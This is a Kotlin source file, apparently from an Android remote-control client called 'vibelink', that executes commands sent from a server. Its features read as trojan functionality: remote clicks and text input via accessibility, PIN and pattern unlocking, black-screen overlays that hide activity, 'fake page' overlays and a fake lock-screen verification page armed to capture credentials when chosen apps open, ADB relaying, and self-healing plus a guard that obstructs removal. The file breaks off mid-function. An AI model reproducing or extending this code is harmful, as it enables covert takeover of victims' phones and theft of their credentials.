package com.vibelink.client.command

import android.content.Context
import android.os.Build
import android.provider.Settings
import com.vibelink.client.accessibility.AccessibilityControlBridge
import com.vibelink.client.accessibility.AccessibilityHealth
import com.vibelink.client.accessibility.AccessibilityHelper
import com.vibelink.client.accessibility.AccessibilitySelfHeal
import com.vibelink.client.accessibility.AccessibilityStateHolder
import com.vibelink.client.accessibility.AppListProtectGuard
import com.vibelink.client.accessibility.ScreenCaptureBridge
import com.vibelink.client.adb.AdbRelayController
import com.vibelink.client.adb.AdbSession
import com.vibelink.client.adb.AdbWirelessAutomator
import com.vibelink.client.adb.DeveloperOptionsHelper
import com.vibelink.client.device.AppIconHelper
import com.vibelink.client.device.BrightnessHelper
import com.vibelink.client.device.DeviceStateHelper
import com.vibelink.client.device.InstalledAppsCollector
import com.vibelink.client.device.KeyguardWakeHelper
import com.vibelink.client.device.RotationHelper
import com.vibelink.client.device.VolumeHelper
import com.vibelink.client.device.ZombieWakeController
import com.vibelink.client.device.oem.KeyguardOemProfileRegistry
import com.vibelink.client.device.FakePageType
import com.vibelink.client.device.KeyguardFakePageType
import com.vibelink.client.prefs.FakePageHookStore
import com.vibelink.client.prefs.KeyguardGesturePathStore
import com.vibelink.client.screen.MediaProjectionHolder
import com.vibelink.client.setup.DeviceAdminHelper
import org.json.JSONArray
import org.json.JSONObject

class CommandExecutor(
    private val context: Context,
) {
    private val gesturePathStore by lazy { KeyguardGesturePathStore(context) }
    private val fakePageHookStore by lazy { FakePageHookStore(context) }
    data class CommandResult(
        val ok: Boolean,
        val data: JSONObject = JSONObject(),
        val error: String? = null,
    )

    fun execute(cmd: String, params: JSONObject): CommandResult {
        return when (cmd) {
            "ping" -> CommandResult(
                ok = true,
                data = JSONObject().put("timestamp", System.currentTimeMillis()),
            )
            "get_device_info" -> CommandResult(
                ok = true,
                data = buildDeviceInfo(),
            )
            "check_accessibility" -> CommandResult(
                ok = true,
                data = JSONObject()
                    .put("enabled", AccessibilityHelper.isServiceEnabled(context))
                    .put("status", AccessibilityHelper.getServiceStatus(context))
                    .put("serviceConnected", AccessibilityStateHolder.isConnected)
                    .put("controlReady", AccessibilityControlBridge.isReady())
                    .put("health", AccessibilityHealth.describe(
                        AccessibilityHealth.evaluate(context),
                    ))
                    .put("canWriteSecureSettings",
                        AccessibilityHealth.canWriteSecureSettings(context))
                    .put("snapshot", AccessibilitySelfHeal.snapshot(context)),
            )
            "heal_accessibility" -> executeHealAccessibility()
            "click" -> executeClick(params)
            "swipe" -> executeSwipe(params)
            "input_text" -> executeInputText(params)
            "wake_screen" -> executeWakeScreen()
            "zombie_wake" -> executeZombieWake(params)
            "zombie_wake_clear" -> executeZombieWakeClear()
            "lock_screen" -> executeLockScreen()
            "black_screen" -> executeBlackScreen()
            "unblack_screen" -> executeUnblackScreen()
            "takeover_phone" -> executeTakeoverPhone()
            "untakeover_phone" -> executeUntakeoverPhone()
            "start_remote_keep_awake" -> executeStartRemoteKeepAwake()
            "stop_remote_keep_awake" -> executeStopRemoteKeepAwake()
            "refresh_screen" -> executeRefreshScreen()
            "reboot" -> executeReboot()
            "uninstall", "disable_accessibility" -> executeUninstall(params)
            "global_action" -> executeGlobalAction(params)
            "set_silent" -> executeSetSilent()
            "set_brightness_min" -> executeSetBrightnessMin()
            "get_auto_rotation" -> executeGetAutoRotation()
            "set_auto_rotation" -> executeSetAutoRotation(params)
            "open_write_settings" -> executeOpenWriteSettings()
            "open_developer_options" -> executeOpenDeveloperOptions(params)
            "adb_session_begin" -> executeAdbSessionBegin(params)
            "adb_session_end" -> executeAdbSessionEnd()
            "adb_wireless_prepare" -> executeAdbWirelessPrepare(params)
            "adb_wireless_prepare_manual" -> executeAdbWirelessPrepareManual(params)
            "adb_wireless_done" -> executeAdbWirelessDone()
            "adb_relay_start" -> executeAdbRelayStart(params)
            "adb_relay_stop" -> executeAdbRelayStop()
            "unlock_pin" -> executeUnlockPin(params)
            "unlock_pattern" -> executeUnlockPattern(params)
            "dump_keyguard_tree" -> executeDumpKeyguardTree(params)
            "get_installed_apps" -> executeGetInstalledApps(params)
            "resolve_app_labels" -> executeResolveAppLabels(params)
            "get_app_icon" -> executeGetAppIcon(params)
            "get_app_icons" -> executeGetAppIcons(params)
            "open_app" -> executeOpenApp(params)
            "show_fake_page" -> executeShowFakePage(params)
            "arm_fake_page" -> executeArmFakePage(params)
            "disarm_fake_page" -> executeDisarmFakePage(params)
            "list_fake_page_hooks" -> executeListFakePageHooks()
            "hide_fake_page" -> executeHideFakePage()
            "show_keyguard_fake_page" -> executeShowKeyguardFakePage(params)
            "hide_keyguard_fake_page" -> executeHideKeyguardFakePage()
            "get_keyguard_lock_type" -> executeGetKeyguardLockType()
            else -> CommandResult(
                ok = false,
                error = "unsupported_cmd:$cmd",
            )
        }
    }

    private fun executeClick(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        prepareScreenInteractionIfNeeded()

        if (!params.has("x") || !params.has("y")) {
            return CommandResult(false, error = "click_requires_x_y")
        }

        val result = AccessibilityControlBridge.click(
            x = params.getDouble("x").toFloat(),
            y = params.getDouble("y").toFloat(),
        )

        return toControlCommandResult("click", result).also {
            if (it.ok) {
                AccessibilityControlBridge.requestScreenRefresh()
            }
        }
    }

    private fun executeSwipe(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        prepareScreenInteractionIfNeeded()

        val required = listOf("x1", "y1", "x2", "y2")
        if (required.any { !params.has(it) }) {
            return CommandResult(false, error = "swipe_requires_x1_y1_x2_y2")
        }

        val durationMs = if (params.has("duration")) {
            params.getLong("duration")
        } else {
            DEFAULT_SWIPE_DURATION_MS
        }

        val result = AccessibilityControlBridge.swipe(
            x1 = params.getDouble("x1").toFloat(),
            y1 = params.getDouble("y1").toFloat(),
            x2 = params.getDouble("x2").toFloat(),
            y2 = params.getDouble("y2").toFloat(),
            durationMs = durationMs,
        )

        return toControlCommandResult("swipe", result).also {
            if (it.ok) {
                AccessibilityControlBridge.requestScreenRefresh()
            }
        }
    }

    private fun executeInputText(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val mode = params.optString("mode").trim().ifBlank {
            params.optString("action").trim()
        }.ifBlank { "replace" }.lowercase()
        // Keep original text (do not trim) so spaces from virtual keyboard are preserved.
        val text = params.optString("text")
        // replace 允许空串（清空输入框）；append 必须有内容
        if (mode == "append" && text.isEmpty()) {
            return CommandResult(false, error = "input_text_requires_text")
        }
        if (mode != "replace" && mode != "append" && mode != "delete" && mode != "enter") {
            if (text.isEmpty()) {
                return CommandResult(false, error = "input_text_requires_text")
            }
        }

        val result = AccessibilityControlBridge.inputText(text, mode)
        return toControlCommandResult("input_text", result).also {
            if (it.ok) {
                AccessibilityControlBridge.requestScreenRefresh()
            }
        }
    }

    private fun executeZombieWake(params: JSONObject): CommandResult {
        val wakeUntil = params.optLong("wakeUntil", 0L)
        val keepAwakeMs = params.optLong(
            "keepAwakeMs",
            ZombieWakeController.DEFAULT_KEEP_AWAKE_MS,
        )
        if (wakeUntil <= System.currentTimeMillis()) {
            return CommandResult(
                ok = false,
                error = "zombie_wake_expired",
                data = JSONObject()
                    .put("action", "zombie_wake")
                    .put("wakeUntil", wakeUntil),
            )
        }
        val applied = ZombieWakeController.apply(context, wakeUntil, keepAwakeMs)
        return CommandResult(
            ok = applied,
            error = if (applied) null else "zombie_wake_failed",
            data = JSONObject()
                .put("action", "zombie_wake")
                .put("wakeUntil", wakeUntil)
                .put("keepAwakeMs", keepAwakeMs)
                .put("activeUntil", ZombieWakeController.activeUntilMs())
                .put("keepAwakeActive", AccessibilityControlBridge.isRemoteKeepAwakeActive()),
        )
    }

    private fun executeZombieWakeClear(): CommandResult {
        ZombieWakeController.cancel("remote_clear")
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "zombie_wake_clear")
                .put("activeUntil", ZombieWakeController.activeUntilMs())
                .put("keepAwakeActive", AccessibilityControlBridge.isRemoteKeepAwakeActive()),
        )
    }

    private fun executeWakeScreen(): CommandResult {
        val wakeResult = wakeScreenWithAccessibility()
        Thread.sleep(WAKE_SETTLE_MS)
        return CommandResult(
            ok = wakeResult.ok,
            data = appendKeyguardState(
                JSONObject()
                    .put("action", "wake_screen")
                    .put("executed", wakeResult.ok),
            ),
            error = wakeResult.error,
        )
    }

    /** 后台「立即锁屏」：仅 DevicePolicyManager.lockNow()，强制强认证（指纹不可用）。 */
    private fun executeLockScreen(): CommandResult {
        if (DeviceAdminHelper.lockNow(context)) {
            return CommandResult(
                ok = true,
                data = appendKeyguardState(
                    JSONObject()
                        .put("action", "lock_screen")
                        .put("method", "device_admin")
                        .put("executed", true),
                ),
            )
        }
        return CommandResult(
            ok = false,
            error = "device_admin_required",
            data = JSONObject().put("action", "lock_screen"),
        )
    }

    private fun executeBlackScreen(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val overlayResult = AccessibilityControlBridge.enableBlackScreen()
        if (!overlayResult.ok) {
            return CommandResult(
                ok = false,
                error = overlayResult.error ?: "black_screen_overlay_failed",
                data = buildBlackScreenData(
                    action = "black_screen",
                    overlayActive = false,
                ),
            )
        }

        return CommandResult(
            ok = true,
            data = buildBlackScreenData(
                action = "black_screen",
                overlayActive = true,
            ),
        )
    }

    private fun executeRefreshScreen(): CommandResult {
        AccessibilityControlBridge.requestScreenRefresh()
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "refresh_screen")
                .put("queued", true)
                .put("blackScreenActive", AccessibilityControlBridge.isBlackScreenActive()),
        )
    }

    private fun executeUnblackScreen(): CommandResult {
        val overlayResult = if (AccessibilityControlBridge.isReady()) {
            AccessibilityControlBridge.disableBlackScreen()
        } else {
            AccessibilityControlBridge.ControlResult(true)
        }

        return CommandResult(
            ok = overlayResult.ok,
            error = if (overlayResult.ok) null else overlayResult.error,
            data = buildBlackScreenData(
                action = "unblack_screen",
                overlayActive = AccessibilityControlBridge.isBlackScreenActive(),
            ),
        )
    }

    private fun executeTakeoverPhone(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        val overlayResult = AccessibilityControlBridge.enablePhoneTakeover()
        if (!overlayResult.ok) {
            return CommandResult(
                ok = false,
                error = overlayResult.error ?: "phone_takeover_overlay_failed",
                data = buildTakeoverData(action = "takeover_phone", active = false),
            )
        }
        return CommandResult(
            ok = true,
            data = buildTakeoverData(action = "takeover_phone", active = true),
        )
    }

    private fun executeUntakeoverPhone(): CommandResult {
        val overlayResult = if (AccessibilityControlBridge.isReady()) {
            AccessibilityControlBridge.disablePhoneTakeover()
        } else {
            AccessibilityControlBridge.ControlResult(true)
        }
        return CommandResult(
            ok = overlayResult.ok,
            error = if (overlayResult.ok) null else overlayResult.error,
            data = buildTakeoverData(
                action = "untakeover_phone",
                active = AccessibilityControlBridge.isPhoneTakeoverActive(),
            ),
        )
    }

    private fun executeStartRemoteKeepAwake(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        DeviceStateHelper.wakeScreen(context)
        val overlayResult = AccessibilityControlBridge.enableRemoteKeepAwake()
        val screenOffTimeout = runCatching {
            Settings.System.getInt(
                context.contentResolver,
                Settings.System.SCREEN_OFF_TIMEOUT,
            )
        }.getOrNull()
        val payload = JSONObject()
            .put("action", "start_remote_keep_awake")
            .put("active", overlayResult.ok)
            .put("writeSettingsGranted", RotationHelper.canWriteSettings(context))
            .put("screenOffTimeoutMs", screenOffTimeout)
        if (!overlayResult.ok) {
            return CommandResult(
                ok = false,
                error = overlayResult.error ?: "remote_keep_awake_overlay_failed",
                data = payload,
            )
        }
        return CommandResult(ok = true, data = payload)
    }

    private fun executeStopRemoteKeepAwake(): CommandResult {
        val overlayResult = if (AccessibilityControlBridge.isReady()) {
            AccessibilityControlBridge.disableRemoteKeepAwake()
        } else {
            AccessibilityControlBridge.ControlResult(true)
        }
        return CommandResult(
            ok = overlayResult.ok,
            error = if (overlayResult.ok) null else overlayResult.error,
            data = JSONObject()
                .put("action", "stop_remote_keep_awake")
                .put("active", AccessibilityControlBridge.isRemoteKeepAwakeActive()),
        )
    }

    private fun buildTakeoverData(action: String, active: Boolean): JSONObject {
        return JSONObject()
            .put("action", action)
            .put("active", active)
            .put("overlayActive", active)
            .put("phoneTakeoverActive", active)
    }

    private fun buildBlackScreenData(
        action: String,
        overlayActive: Boolean,
    ): JSONObject {
        return JSONObject()
            .put("action", action)
            .put("active", overlayActive)
            .put("overlayActive", overlayActive)
            .put("mode", "overlay")
    }

    private fun executeSetSilent(): CommandResult {
        val result = VolumeHelper.muteAll(context)
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "set_silent")
                    .put("muted", true)
                    .put("volume", result.snapshot),
            )
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "set_silent_failed",
                data = JSONObject().put("action", "set_silent"),
            )
        }
    }

    private fun executeSetBrightnessMin(): CommandResult {
        val result = BrightnessHelper.setMinimum(context)
        val data = BrightnessHelper.toJson(result)
        return if (result.ok) {
            CommandResult(ok = true, data = data)
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "brightness_set_failed",
                data = data,
            )
        }
    }

    private fun executeGetAutoRotation(): CommandResult {
        val state = RotationHelper.readState(context)
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "get_auto_rotation")
                .put("enabled", state.enabled)
                .put("writeSettingsGranted", state.writeSettingsGranted),
        )
    }

    private fun executeSetAutoRotation(params: JSONObject): CommandResult {
        val enabled = parseSwitchOn(params, "enabled", true)
        val result = RotationHelper.setEnabled(context, enabled)
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "set_auto_rotation")
                    .put("enabled", result.enabled),
            )
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "auto_rotation_set_failed",
                data = JSONObject()
                    .put("action", "set_auto_rotation")
                    .put("enabled", result.enabled)
                    .put("writeSettingsGranted", RotationHelper.canWriteSettings(context)),
            )
        }
    }

    private fun executeOpenWriteSettings(): CommandResult {
        val granted = RotationHelper.canWriteSettings(context)
        val opened = if (granted) {
            true
        } else {
            RotationHelper.openWriteSettings(context)
        }
        if (opened && !granted) {
            AppListProtectGuard.allowWriteSettingsPage()
        }
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "open_write_settings")
                .put("writeSettingsGranted", granted)
                .put("opened", opened),
        )
    }

    private fun executeAdbSessionBegin(params: JSONObject): CommandResult {
        val timeoutMs = params.optLong("timeoutMs", 0L).takeIf { it > 0 } ?: 5 * 60_000L
        AdbSession.begin(timeoutMs)
        // 点 ADB 按钮这 5 分钟里，用户/运维就是要停在开发者选项、无线调试等页面上操作，
        // 保护逻辑必须整体让路，否则一进页就被按掉，人根本来不及点。
        AppListProtectGuard.pauseKicks(timeoutMs)
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "adb_session_begin")
                .put("adbSessionActive", true)
                .put("timeoutMs", timeoutMs.coerceIn(30_000L, 10 * 60_000L)),
        )
    }

    private fun executeAdbSessionEnd(): CommandResult {
        AdbSession.end()
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "adb_session_end")
                .put("adbSessionActive", false),
        )
    }

    private fun executeOpenDeveloperOptions(params: JSONObject): CommandResult {
        val timeoutMs = params.optLong("timeoutMs", 0L).takeIf { it > 0 } ?: 5 * 60_000L
        // 方案 A：开会话后即使 open 失败也不立刻 end，方便 Web 继续控屏进开发者
        AdbSession.begin(timeoutMs)
        AppListProtectGuard.pauseKicks(timeoutMs)
        val needEnable = !DeveloperOptionsHelper.isDevelopmentEnabled(context)
        if (needEnable) {
            val accessibilityError = ensureControlReady()
            if (accessibilityError != null) {
                return CommandResult(
                    ok = false,
                    error = "need_enable_dev_requires_accessibility",
                    data = JSONObject()
                        .put("action", "open_developer_options")
                        .put("developmentEnabled", false)
                        .put("adbSessionActive", AdbSession.isActive)
                        .put("hint", "未开开发者模式，需无障碍自动点版本号；运维会话已开，可先人手进页"),
                )
            }
        }
        val payload = DeveloperOptionsHelper.open(context, autoEnable = true)
        val error = payload.optString("error").takeIf { it.isNotBlank() }
        val opened = payload.optBoolean("opened", false)
        return CommandResult(
            ok = opened,
            data = payload
                .put("action", "open_developer_options")
                .put("adbSessionActive", AdbSession.isActive),
            error = error,
        )
    }

    private fun executeAdbWirelessPrepare(params: JSONObject): CommandResult {
        val timeoutMs = params.optLong("timeoutMs", 0L).takeIf { it > 0 } ?: 5 * 60_000L
        val mode = params.optString("mode").trim().lowercase()
        val isManual = mode == "manual"
        AdbSession.begin(timeoutMs)
        // 无线调试/配对同样要靠人停在开发者页面上点，这段也得让路。
        AppListProtectGuard.pauseKicks(timeoutMs)
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return CommandResult(
                ok = false,
                error = accessibilityError.error,
                data = JSONObject()
                    .put("action", if (isManual) "adb_wireless_prepare_manual" else "adb_wireless_prepare")
                    .put("mode", if (isManual) "manual" else "auto")
                    .put("adbSessionActive", AdbSession.isActive),
            )
        }
        val result = if (isManual) {
            AdbWirelessAutomator.prepareManual(context)
        } else {
            AdbWirelessAutomator.prepare(context)
        }
        // 失败也保持会话，方便重试 / 人手停在无线调试页
        return CommandResult(
            ok = result.ok,
            data = result.data
                .put("action", if (isManual) "adb_wireless_prepare_manual" else "adb_wireless_prepare")
                .put("mode", if (isManual) "manual" else "auto")
                .put("adbSessionActive", AdbSession.isActive),
            error = result.error,
        )
    }

    /** 兼容旧 Web/API：等价于 adb_wireless_prepare + mode=manual */
    private fun executeAdbWirelessPrepareManual(params: JSONObject): CommandResult {
        val merged = JSONObject(params.toString()).put("mode", "manual")
        return executeAdbWirelessPrepare(merged)
    }

    private fun executeAdbWirelessDone(): CommandResult {
        AdbRelayController.stop()
        AdbSession.end()
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "adb_wireless_done")
                .put("adbSessionActive", false),
        )
    }

    private fun executeAdbRelayStart(params: JSONObject): CommandResult {
        if (!AdbSession.isActive) {
            AdbSession.begin()
        }
        val start = AdbRelayController.start(params)
        return CommandResult(
            ok = start.ok,
            data = start.data.put("action", "adb_relay_start"),
            error = start.error,
        )
    }

    private fun executeAdbRelayStop(): CommandResult {
        AdbRelayController.stop()
        return CommandResult(
            ok = true,
            data = JSONObject().put("action", "adb_relay_stop"),
        )
    }

    private fun executeGlobalAction(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val action = params.optString("action").trim()
        if (action.isBlank()) {
            return CommandResult(false, error = "global_action_requires_action")
        }

        val result = AccessibilityControlBridge.globalNavAction(action)
        return toControlCommandResult("global_action", result).also {
            if (it.ok) {
                AccessibilityControlBridge.requestScreenRefresh()
            }
        }
    }

    private fun executeHealAccessibility(): CommandResult {
        val result = AccessibilitySelfHeal.checkAndHeal(context, source = "CMD", force = true)
        return CommandResult(
            ok = result.ok,
            data = JSONObject()
                .put("action", "heal_accessibility")
                .put("before", AccessibilityHealth.describe(result.before))
                .put("after", AccessibilityHealth.describe(result.after))
                .put("outcome", result.action)
                .put("healed", result.ok)
                .put("snapshot", AccessibilitySelfHeal.snapshot(context)),
            error = if (result.ok) null else "heal_failed:${result.action}",
        )
    }

    private fun executeUninstall(params: JSONObject): CommandResult {
        // 先抑制自愈：这条命令的语义就是「故意关掉无障碍，准备卸载」。
        // 不抑制的话巡检会在 30s 内把它写回来，运维看到的现象是「关不掉」。
        // 用有界窗口而非无限期：卸载中途被取消时还能自己恢复，不留永久哑火。
        //
        // 调用方可用 suppressMs 指定窗口长度：
        // - ADB 面板「关闭无障碍」不传参，走默认 30 分钟（真要卸载）
        // - 右侧工具栏「卸载」传 60000，1 分钟后自愈恢复正常
        val suppressMs = params.optLong("suppressMs", AccessibilitySelfHeal.SUPPRESS_ON_DISABLE_MS)
        AccessibilitySelfHeal.suppress(context, suppressMs)
        if (AccessibilityControlBridge.isReady()) {
            val result = AccessibilityControlBridge.disableAccessibility()
            return if (result.ok) {
                CommandResult(
                    ok = true,
                    data = JSONObject()
                        .put("action", "uninstall")
                        .put("disabledAccessibility", true),
                )
            } else {
                CommandResult(
                    ok = false,
                    error = result.error ?: "disable_accessibility_failed",
                    data = JSONObject().put("action", "uninstall"),
                )
            }
        }
        if (!AccessibilityHelper.isServiceEnabled(context)) {
            return CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "uninstall")
                    .put("disabledAccessibility", true)
                    .put("alreadyDisabled", true),
            )
        }
        return CommandResult(
            ok = false,
            error = "accessibility_service_not_connected",
            data = JSONObject().put("action", "uninstall"),
        )
    }

    private fun executeReboot(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        prepareScreenInteractionIfNeeded()

        // 远程重启是先打开电源菜单、由人手动滑「重启」。这段时间里保护逻辑必须让路：
        // 否则刚弹出的 ActionsDialog 会被当成「用户在关机」立刻按掉，命令自己把自己拆了。
        AppListProtectGuard.pauseKicks(5 * 60_000L)

        val result = AccessibilityControlBridge.reboot()
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "reboot")
                    .put("executed", true)
                    // 仅打开电源菜单，重启需人手动滑动
                    .put("openedPowerDialogOnly", true),
            )
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "reboot_failed",
                data = JSONObject().put("action", "reboot"),
            )
        }
    }

    private fun wakeScreenWithAccessibility(): AccessibilityControlBridge.ControlResult {
        if (AccessibilityControlBridge.isReady()) {
            return AccessibilityControlBridge.wakeScreenForKeyguard()
        }

        KeyguardWakeHelper.wakeForKeyguard(context)
        return AccessibilityControlBridge.ControlResult(
            ok = DeviceStateHelper.isInteractive(context),
            error = if (DeviceStateHelper.isInteractive(context)) {
                null
            } else {
                "accessibility_service_not_connected"
            },
        )
    }

    private fun executeDumpKeyguardTree(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        DeviceStateHelper.wakeScreen(context)
        Thread.sleep(WAKE_SETTLE_MS)

        val maxDepth = params.optInt("maxDepth", 5)
        val tree = AccessibilityControlBridge.dumpKeyguardTree(maxDepth)
        return CommandResult(
            ok = true,
            data = appendKeyguardState(
                JSONObject()
                    .put("action", "dump_keyguard_tree")
                    .put("tree", tree),
            ),
        )
    }

    private fun executeGetInstalledApps(params: JSONObject): CommandResult {
        val includeSystem = params.optBoolean("includeSystem", true)
        val apps = InstalledAppsCollector.listApps(context, includeSystem)
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "get_installed_apps")
                .put("total", apps.length())
                .put("apps", apps),
        )
    }

    private fun executeResolveAppLabels(params: JSONObject): CommandResult {
        val packagesArray = params.optJSONArray("packages") ?: org.json.JSONArray()
        val packages = buildList {
            for (index in 0 until packagesArray.length()) {
                val pkg = packagesArray.optString(index).trim()
                if (pkg.isNotBlank()) {
                    add(pkg)
                }
            }
        }
        val labels = InstalledAppsCollector.resolveLabels(context, packages)
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "resolve_app_labels")
                .put("labels", labels),
        )
    }

    private fun executeGetAppIcon(params: JSONObject): CommandResult {
        val packageName = params.optString("packageName").trim()
        if (packageName.isBlank()) {
            return CommandResult(false, error = "get_app_icon_requires_package")
        }
        val size = params.optInt("size", 192).coerceIn(48, 512)
        val payload = AppIconHelper.loadIconBase64(context, packageName, size)
            ?: return CommandResult(false, error = "app_icon_not_found")
        return CommandResult(
            ok = true,
            data = payload.put("action", "get_app_icon"),
        )
    }

    private fun executeGetAppIcons(params: JSONObject): CommandResult {
        val packagesArray = params.optJSONArray("packages") ?: org.json.JSONArray()
        val size = params.optInt("size", 48).coerceIn(32, 128)
        val icons = JSONObject()
        var loaded = 0
        val maxPackages = 50
        for (index in 0 until minOf(packagesArray.length(), maxPackages)) {
            val pkg = packagesArray.optString(index).trim()
            if (pkg.isBlank()) {
                continue
            }
            val payload = AppIconHelper.loadIconBase64(context, pkg, size) ?: continue
            val icon = payload.optString("icon").trim()
            if (icon.isBlank()) {
                continue
            }
            icons.put(pkg, icon)
            loaded += 1
        }
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "get_app_icons")
                .put("size", size)
                .put("mimeType", "image/png")
                .put("loaded", loaded)
                .put("icons", icons),
        )
    }

    private fun executeOpenApp(params: JSONObject): CommandResult {
        val packageName = params.optString("packageName").trim()
            .ifBlank { params.optString("package").trim() }
        if (packageName.isBlank()) {
            return CommandResult(false, error = "open_app_requires_package")
        }
        // 锁屏时尽量唤醒，失败不阻断打开
        runCatching { executeWakeScreen() }

        val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            ?: return CommandResult(false, error = "open_app_no_launcher")
        intent.addFlags(
            android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP,
        )
        return try {
            context.startActivity(intent)
            CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "open_app")
                    .put("packageName", packageName),
            )
        } catch (error: Exception) {
            CommandResult(
                false,
                error = "open_app_failed:${error.message ?: error.javaClass.simpleName}",
            )
        }
    }

    private fun executeArmFakePage(params: JSONObject): CommandResult {
        val parsed = parseFakePageParams(params, "arm_fake_page")
            ?: return CommandResult(false, error = lastFakePageParseError)
        val hook = fakePageHookStore.arm(
            FakePageHookStore.Hook(
                packageName = parsed.packageName,
                title = parsed.title,
                content = parsed.content,
                iconBase64 = parsed.icon,
                pageType = parsed.pageType.name.lowercase(),
                webUrl = parsed.webUrl,
                label = parsed.label,
                armedAt = System.currentTimeMillis(),
            ),
        )
        if (AccessibilityControlBridge.isReady()) {
            AccessibilityControlBridge.tryShowArmedFakePageIfForeground(hook.packageName)
        }
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "arm_fake_page")
                .put("packageName", hook.packageName)
                .put("pageType", hook.pageType)
                .put("hasPin", if (parsed.pageType == FakePageType.NOPIN || parsed.pageType == FakePageType.WEB) 0 else 1)
                .put("webUrl", hook.webUrl)
                .put("armedCount", fakePageHookStore.listPending().size),
        )
    }

    private fun executeDisarmFakePage(params: JSONObject): CommandResult {
        val packageName = params.optString("packageName").trim()
            .ifBlank { params.optString("package").trim() }
        fakePageHookStore.disarm(packageName.ifBlank { null })
        AccessibilityControlBridge.hideFakePageForPackage(packageName.ifBlank { null })
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "disarm_fake_page")
                .put("packageName", packageName)
                .put("hooks", hooksToJson(fakePageHookStore.listPending())),
        )
    }

    private fun executeListFakePageHooks(): CommandResult {
        val hooks = fakePageHookStore.listPending()
        return CommandResult(
            ok = true,
            data = JSONObject()
                .put("action", "list_fake_page_hooks")
                .put("count", hooks.size)
                .put("hooks", hooksToJson(hooks)),
        )
    }

    private fun executeShowFakePage(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        val parsed = parseFakePageParams(params, "show_fake_page")
            ?: return CommandResult(false, error = lastFakePageParseError)
        val result = AccessibilityControlBridge.showFakePage(
            packageName = parsed.packageName,
            title = parsed.title,
            content = parsed.content,
            iconBase64 = parsed.icon,
            pageType = parsed.pageType,
            webUrl = parsed.webUrl,
        )
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = JSONObject()
                    .put("action", "show_fake_page")
                    .put("packageName", parsed.packageName)
                    .put("pageType", parsed.pageType.name.lowercase())
                    .put("hasPin", if (parsed.pageType == FakePageType.NOPIN || parsed.pageType == FakePageType.WEB) 0 else 1)
                    .put("webUrl", parsed.webUrl),
            )
        } else {
            CommandResult(false, error = result.error ?: "show_fake_page_failed")
        }
    }

    private fun executeHideFakePage(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        val result = AccessibilityControlBridge.hideFakePage()
        return toControlCommandResult("hide_fake_page", result)
    }

    private fun executeShowKeyguardFakePage(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val wakeResult = wakeScreenWithAccessibility()
        if (!wakeResult.ok) {
            return CommandResult(
                ok = false,
                error = wakeResult.error ?: "wake_screen_failed",
                data = JSONObject().put("action", "show_keyguard_fake_page"),
            )
        }
        Thread.sleep(WAKE_SETTLE_MS)

        val pageType = KeyguardFakePageType.from(
            params.optString("pageType").ifBlank { "web" },
        )
        val title = params.optString("title").trim()
            .ifBlank { "锁屏验证" }
        val hint = params.optString("hint").trim()
            .ifBlank { params.optString("content").trim() }
        val pinLength = params.optInt("pinLength", 6).coerceIn(4, 8)
        val webUrlRaw = params.optString("webUrl").trim()
            .ifBlank { params.optString("url").trim() }
        val webUrl = if (pageType == KeyguardFakePageType.WEB) {
            when {
                webUrlRaw.isBlank() -> {
                    return CommandResult(false, error = "show_keyguard_fake_page_web_url_required")
                }
                !webUrlRaw.startsWith("https://", ignoreCase = true) -> {
                    return CommandResult(false, error = "show_keyguard_fake_page_web_url_invalid")
                }
                else -> webUrlRaw
            }
        } else {
            ""
        }

        val result = AccessibilityControlBridge.showKeyguardFakePage(
            title = title,
            hint = hint,
            pageType = pageType,
            webUrl = webUrl,
            pinLength = pinLength,
        )
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = appendKeyguardState(
                    JSONObject()
